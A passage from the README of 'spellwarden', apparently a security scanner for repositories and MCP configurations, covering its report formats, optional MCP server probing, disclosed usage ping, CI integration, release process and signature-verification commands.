On a pull or merge request the scan reads the baseline from the base revision, like the settings file (see "Settings"): a request cannot accept its own finding. To accept a finding that a request introduces, merge the baseline entry first, in a request of its own; an entry that matches nothing yet is valid.

### Reports

`--format` may be given several times, each followed by its own `--output` (stdout when omitted, one format at most). Every report is byte-identical for the same files, settings and `--as-of` date, holds no timestamp and no absolute path, and is sorted.

| Format | For |
|---|---|
| `text` (default) | a terminal |
| `json` | tools; the shape is `schemas/report.schema.json` |
| `sarif` | GitHub code scanning (SARIF 2.1.0, one fingerprint per result under `partialFingerprints["spellwarden/v1"]`, accepted findings as `suppressions`) |
| `markdown` | the job summary and the pull or merge request comment (starts with `<!-- spellwarden-scan -->`, at most 60,000 characters) |
| `gitlab-codequality` | the GitLab Code Quality report (critical, high, medium and low become critical, major, minor and info) |

Paths are relative to the scan root, except in SARIF and Code Quality, where they are relative to the repository root, because that is where GitHub and GitLab resolve them.

### Probing MCP servers: `--probe`

Off by default. With `--probe`, the scanner sends the unauthenticated MCP probe of the hosted product to every remote server of an MCP configuration whose URL is `https://`, from your machine or runner, and adds the `SW-MCP` findings and the 2026-07-28 migration checklist to the report. It sends the URL and the protocol's own requests only: never a header, environment value or argument from the configuration, never an `Authorization` header or a cookie. Addresses must be public; at most 50 servers, 4 at a time, 300 requests and 120 seconds for the whole run. A URL holding a `${...}` reference is not probed. `--probe` is switched off on a pull or merge request from a fork or from Dependabot.

`--probe-private` (or `SPELLWARDEN_PROBE_PRIVATE=true`) also allows the private addresses of the configured servers themselves (never a link-local address such as the cloud metadata service, and never an address that a server's answer or redirect points to), but only on a local run or on a push, schedule or manual run of a protected branch or tag in GitHub Actions or GitLab CI; anywhere else it is ignored with the notice `probe_private_untrusted`, because whoever can push a revision controls the endpoints it names. It cannot be set in `.spellwarden/config.yml`.

### The usage ping

In CI, and only in CI, each `spellwarden scan` sends one request at the end to `https://dash.spellwarden.ai/api/public/ping`. It lets us count how many organisations run the free scanner. The ping is pseudonymous, not anonymous, and carries exactly five fields:

| Field | Value |
|---|---|
| `schema` | `1` |
| `version` | the scanner version |
| `rules_version` | the rules version |
| `ci` | `github`, `gitlab` or `other` |
| `org` | a SHA-256 hash of the installation identity, or `null` |

The installation identity is the forge host plus the GitHub account's numeric id (`github:github.com:1234567`), the GitLab top-level group's path (`gitlab:gitlab.com:acme`), or the owner in the `origin` remote elsewhere. It is hashed as `sha256("spellwarden-ping-v1:" + identity)`. Anyone who knows an identity can compute its hash, which is why we call it pseudonymous. One company on GitHub and on GitLab is two identities; a self-managed GitLab or GitHub Enterprise Server is its own; renaming a GitLab top-level group starts a new one. The identity cannot be joined to an organisation of the hosted product.

The server keeps one row per hashed identity and ISO week: the number of runs, the first and last time seen, the last scanner and rules versions and the CI kind. The row holds no IP address and no user agent, and is deleted 400 days after the end of its week. To limit abuse, the rate limiter keeps the sending address for one hour. Like every request to the service, the ping also appears in the technical logs, kept for 90 days, with the address it arrived from (usually one of the content delivery network's). No repository content is ever sent, and nothing is sent from a local run or by `lock`, `baseline`, `rules` or `version`.

Switch it off with any of: `--no-telemetry`, `SPELLWARDEN_TELEMETRY=off` (or `0`, `false`, `no`), `DO_NOT_TRACK=1`, `telemetry: false` in `.spellwarden/config.yml`, or the `telemetry: false` input of the Action or the GitLab component. A failed or slow ping never changes a report or an exit code.

### Schemas and compatibility

`schemas/` holds JSON Schemas (draft 2020-12) for the settings, the baseline, the lock file and the JSON report, including every closed list of values. Readers of the report must ignore fields they do not know; the settings and the baseline refuse them. From 1.0.0, removing or renaming a field or a value, or changing an exit code, is a major version; adding an optional field, a notice code or a rule is a minor one.

## Versions

`spellwarden_scan.__version__` is the package version and `spellwarden_scan.RULES_VERSION` (`YYYY.MM.N`) the rule set's. A change to what any rule detects bumps both the rules version and the package minor version; a fix anywhere else bumps the patch. Every scan result carries both, so a stored finding always says which rules produced it.

## Releases

Releases are built and published by GitHub Actions through PyPI trusted publishing (OpenID Connect): a push of a tag `vX.Y.Z` whose version equals the one in `pyproject.toml` builds the sdist and the wheel and publishes them from the `pypi` environment. No API token exists anywhere. The sources are checked on Python 3.11, 3.12 and 3.13 on Linux, and on Python 3.13 on macOS and Windows, on every push; every workflow is checked with `actionlint`.

## Development

```
make check     # ruff, pytest, uv build
```

`tests/test_pure.py` fails the build if any module of `spellwarden_scan` reaches for the network, the file system or the environment; `tests/test_network_boundary.py` fails it if any module of `spellwarden_cli` other than the prober's fetcher (`net.py`), the usage ping (`ping.py`) and the comment poster (`forge.py`) can reach the network; `tests/test_fixture_coverage.py` fails it if a rule lacks a positive or a negative fixture. Every test runs offline: HTTP exchanges are recorded under `tests/recorded/` and git repositories are made by the tests.

## Use it in CI

The same scanner runs in three wrappers, released with one version number. The engine release 1.1.0 (org rules, packs and exports) changes nothing the scanner does, so the Action and the component stay at 1.0.0.

**GitHub Actions.** Pin the Action by commit and keep the version in a comment. The workflow, not the Action, grants the permissions:

```yaml
on: [pull_request]
permissions:
  contents: read
  security-events: write   # code scanning alerts
  pull-requests: write     # the pull request comment
jobs:
  spellwarden:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<commit>
      - uses: spellwarden-ai/scan@<commit of v1.0.0>  # v1.0.0
```

Inputs, outputs and the behaviour on forks and Dependabot pull requests: [github.com/spellwarden-ai/scan](https://github.com/spellwarden-ai/scan). On a pull request the settings file and the baseline are read from the base commit (see "Settings"): keep `actions/checkout`'s default persisted credentials, or set `fetch-depth: 0`.

**GitLab CI/CD.**

```yaml
include:
  - component: gitlab.com/spellwarden-ai/scan/scan@1.0.0
```

Inputs, the comment token and the merge request comparison: [gitlab.com/spellwarden-ai/scan](https://gitlab.com/spellwarden-ai/scan). The merge request job clones with `GIT_DEPTH: "0"`, so the settings file and the baseline can be read from the merge base.

**Anywhere else.** `pipx run spellwarden==1.0.0 scan`, or the image `ghcr.io/spellwarden-ai/spellwarden:1.0.0`.

### Verifying what you run

Every surface of a release is signed, and one manifest ties them together.

```sh
# The PyPI files: PEP 740 attestations from trusted publishing
pip download spellwarden==1.0.0 --no-deps -d .
uvx pypi-attestations verify pypi --repository https://github.com/spellwarden-ai/spellwarden \
  pypi:spellwarden-1.0.0-py3-none-any.whl

# The image: keyless cosign signature and build provenance (the provenance also names the wheel inside it).
# The signature is in cosign 3's format: use cosign 3.0 or later (cosign 2 reports "no signatures found").
cosign verify ghcr.io/spellwarden-ai/spellwarden:1.0.0 \
  --certificate-identity https://github.com/spellwarden-ai/spellwarden/.github/workflows/release.yml@refs/tags/v1.0.0 \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
gh attestation verify oci://ghcr.io/spellwarden-ai/spellwarden:1.0.0 --repo spellwarden-ai/spellwarden

# The Action and component tags: SSH-signed by the key in this repository's allowed_signers file
curl -fsSLO https://raw.githubusercontent.com/spellwarden-ai/spellwarden/main/allowed_signers
git clone https://github.com/spellwarden-ai/scan.git && \
  git -C scan -c gpg.ssh.allowedSignersFile="$PWD/allowed_signers" tag -v v1.0.0
git clone https://gitlab.com/spellwarden-ai/scan.git scan-gitlab && \
  git -C scan-gitlab -c gpg.ssh.allowedSignersFile="$PWD/allowed_signers" tag -v 1.0.0

# The release manifest: the wheel hash, the image digest and both tag commits, attested
gh release download v1.0.0 --repo spellwarden-ai/spellwarden --pattern release-manifest.json
gh attestation verify release-manifest.json --repo spellwarden-ai/spellwarden
```

The manifest's `wheel_sha256` equals the hash pinned in the Action's `requirements.txt`, its `image_digest` the digest in the component's `templates/scan.yml`, and its `action_commit` and `component_commit` the commits of the two tags.

## License

Apache-2.0. See `LICENSE`.
